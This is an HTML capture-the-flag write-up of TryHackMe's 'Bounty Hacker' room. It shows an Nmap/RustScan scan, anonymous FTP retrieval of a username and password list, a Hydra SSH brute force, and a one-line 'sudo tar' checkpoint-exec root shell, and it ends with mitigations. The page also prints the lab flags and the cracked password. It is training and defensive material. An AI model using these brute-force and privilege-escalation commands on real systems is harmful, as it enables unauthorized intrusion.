@@ -1,0 +1,176 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bounty Hacker — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="Anonymous FTP served up a username (lin from task.txt) and a custom password wordlist (locks.txt). Hydra cracked the SSH password from that list in…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/bountyhacker.html">
+<meta property="og:title" content="Bounty Hacker — TryHackMe writeup">
+<meta property="og:description" content="Anonymous FTP served up a username (lin from task.txt) and a custom password wordlist (locks.txt). Hydra cracked the SSH password from that list in…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/bountyhacker.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Bounty Hacker — TryHackMe writeup","description":"Anonymous FTP served up a username (lin from task.txt) and a custom password wordlist (locks.txt). Hydra cracked the SSH password from that list in…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-07","url":"https://thecyberfarhan.github.io/writeups/bountyhacker.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/bountyhacker.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Bounty Hacker</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 7, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>Anonymous FTP served up a username (<code>lin</code> from <code>task.txt</code>) and a custom password wordlist (<code>locks.txt</code>). Hydra cracked the SSH password from that list in seconds. Once in as <code>lin</code>, a single <code>sudo tar</code> GTFOBins one-liner with <code>--checkpoint-action=exec</code> spawned a root shell. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">📂 FTP client</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🐉 Hydra</span><span class="chip">🔑 SSH</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Bounty Hacker</strong> — a Cowboy Bebop themed room where you're cast as a hacker trying to impress the crew of the Bebop. Jet wants root. Ed is busy. Faye is unimpressed, as usual. The machine itself is the digital equivalent of leaving your front door open with a note on it saying "username is on the kitchen table." Anonymous FTP, a custom wordlist that might as well be labelled "try these," and a <code>sudo</code> rule that grants <code>tar</code> to a non-root user. *See you, Space Cowboy.*</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>FTP basics and anonymous login</li><li>What a wordlist is and how Hydra uses one</li><li>How SSH works</li><li>What <code>sudo -l</code> reveals and how GTFOBins exploits trusted binaries</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Full port range with RustScan, Nmap for service fingerprinting:</p>
+<pre><code>rustscan -a 10.49.182.111 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.5 — <strong>anonymous login allowed</strong></td></tr><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.41 (Ubuntu)</td></tr></tbody></table>
+<p>Anonymous FTP flagged by Nmap immediately. This is becoming a pattern — if the scanner hands you an open door, you walk through it first. SSH on standard port 22 this time.</p>
+<h3>Anonymous FTP</h3>
+<p class="aside">The passive mode PASV error appeared immediately — FTP defaulted to active mode cleanly on its own this time:</p>
+<pre><code>ftp 10.49.182.111</code></pre>
+
+<pre><code>Name: anonymous
+230 Login successful.
+ftp&gt; ls
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt</code></pre>
+<p>Two files. Both downloaded immediately.</p>
+<p class="aside">Retrieving both files:</p>
+<pre><code>ftp&gt; get task.txt
+ftp&gt; get locks.txt</code></pre>
+
+<pre><code># task.txt contents
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin</code></pre>
+
+<pre><code># locks.txt contents (excerpt)
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+...
+RedDr4gonSynd1cat3
+...</code></pre>
+<p class="aside">(truncated — full wordlist: 26 entries)</p>
+<p><code>task.txt</code> signs off as <code>lin</code> — that's the username. <code>locks.txt</code> is a 26-entry custom password list. The box is practically writing the Hydra command for us.</p>
+<h3>Web Directory Enumeration</h3>
+<p class="aside">(~5 mins into the box)</p>
+<p>The homepage renders a crew picture and the in-character dialogue — nothing interactive. Feroxbuster ran regardless.</p>
+<p class="aside">Directory brute force with PHP, TXT, and HTML extensions:</p>
+<pre><code>feroxbuster -u http://10.49.182.111 \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+200  http://10.49.182.111/index.html
+301  http://10.49.182.111/images
+301  http://10.49.182.111/javascript</code></pre>
+<p>Nothing actionable. The web server is set decoration. The real attack surface is FTP and SSH.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~7 mins into the box)</p>
+<h3>SSH Brute Force — Hydra</h3>
+<p>With username <code>lin</code> confirmed from the FTP note and a custom wordlist already in hand, Hydra's job here is almost ceremonial.</p>
+<p class="aside">Brute forcing SSH with the recovered wordlist — <code>-t 4</code> recommended for SSH to avoid connection throttling:</p>
+<pre><code>hydra -l lin -P /home/farhan/locks.txt ssh://10.49.182.111</code></pre>
+
+<pre><code># output
+[22][ssh] host: 10.49.182.111   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed</code></pre>
+<p>Six seconds. 26 candidates. One hit.</p>
+<h3>Credentials Found</h3>
+<table><thead><tr><th>Username</th><th>Password</th><th>Where Found</th></tr></thead><tbody><tr><td><code>lin</code></td><td><code>RedDr4gonSynd1cat3</code></td><td><code>task.txt</code> (username) + <code>locks.txt</code> brute force</td></tr></tbody></table>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~8 mins into the box)</p>
+<p class="aside">SSH login as <code>lin</code>:</p>
+<pre><code>ssh lin@10.49.182.111</code></pre>
+
+<pre><code># output
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+lin@ip-10-49-182-111:~$</code></pre>
+<p class="aside">Locating and reading the user flag:</p>
+<pre><code>find / -name user.txt 2&gt;/dev/null
+cat /home/lin/Desktop/user.txt</code></pre>
+
+<pre><code>THM{CR1M3_SyNd1C4T3}</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~9 mins into the box)</p>
+<h3>sudo tar — GTFOBins</h3>
+<p class="aside">Checking what <code>lin</code> can run as root:</p>
+<pre><code>sudo -l</code></pre>
+
+<pre><code>User lin may run the following commands on ip-10-49-182-111:
+    (root) /bin/tar</code></pre>
+<p><strong>Why is <code>sudo tar</code> dangerous?</strong> <code>tar</code> is an archiving tool — but it supports a <code>--checkpoint-action</code> option designed for running scripts at archive checkpoints. When combined with <code>--checkpoint=1</code>, the action fires immediately on the first file. Passing <code>exec=/bin/sh</code> as the action tells <code>tar</code> to spawn a shell at that checkpoint. Since <code>tar</code> is running as root via <code>sudo</code>, the spawned shell inherits root privileges. This is a classic GTFOBins escalation: the binary has a legitimate feature that becomes a privilege escalation vector when run with elevated permissions.</p>
+<p class="aside">One command to root — archiving <code>/dev/null</code> to <code>/dev/null</code> as a throwaway operation, firing the checkpoint immediately:</p>
+<pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
+
+<pre><code># output
+tar: Removing leading '/' from member names
+# whoami
+root</code></pre>
+<p class="aside">Reading the root flag:</p>
+<pre><code>cat /root/root.txt</code></pre>
+
+<pre><code>THM{80UN7Y_h4cK3r}</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Anonymous FTP</strong> → <code>task.txt</code> revealed username <code>lin</code>, <code>locks.txt</code> provided a custom password wordlist</li><li><strong>Hydra SSH brute force</strong> against the 26-entry wordlist → plaintext password <code>RedDr4gonSynd1cat3</code></li><li><strong>SSH login</strong> as <code>lin</code> → user flag</li><li><strong><code>sudo tar</code> GTFOBins</strong> → root shell in one command → root flag</li></ol>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Anonymous FTP serving sensitive files</td><td class="sev-high">High</td><td>Disable anonymous FTP; never store usernames or password lists on publicly accessible services</td></tr><tr><td>Weak/guessable password in a short custom wordlist</td><td class="sev-high">High</td><td>Use long, randomly generated passwords; never maintain a "list of candidate passwords" anywhere on the system</td></tr><tr><td><code>sudo tar</code> with <code>NOPASSWD</code></td><td class="sev-critical">Critical</td><td>Remove <code>tar</code> from <code>sudoers</code>; if archiving tasks require elevated access, use <code>sudoedit</code> or a dedicated restricted script — consult GTFOBins before adding any binary to <code>sudoers</code></td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>GTFOBins is not just a list of fun tricks — it's a mandatory pre-flight checklist before granting <code>sudo</code> to any binary. If the tool appears on GTFOBins, granting it unrestricted <code>sudo</code> is granting root. <code>tar</code>, <code>vim</code>, <code>less</code>, <code>awk</code>, <code>python</code>, <code>perl</code>, <code>find</code> — the list is long and the escalations are trivial.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Skip Feroxbuster entirely — the homepage had no links, no forms, and no dynamic content. A quick manual check of <code>robots.txt</code> and page source would confirm there's nothing there in thirty seconds, saving three minutes of scan time.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/bountyhacker_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
